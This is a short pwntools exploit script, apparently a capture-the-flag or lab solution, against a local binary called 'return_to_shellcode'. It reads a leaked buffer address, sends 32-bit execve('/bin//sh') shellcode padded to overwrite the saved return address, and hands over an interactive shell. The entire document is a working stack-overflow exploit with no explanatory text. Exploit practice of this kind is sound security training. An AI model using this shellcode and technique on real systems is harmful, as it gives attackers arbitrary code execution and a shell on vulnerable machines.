from pwn import *

p = process("./return_to_shellcode")

p.recvuntil("buf : ")

buf = int(p.recv(10), 16)

print(hex(buf))

p.recvuntil("your exploit : ")

payload = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"
payload += "A" * (264 - len(payload))
payload += p32(buf)

pause()

p.sendline(payload)

p.interactive()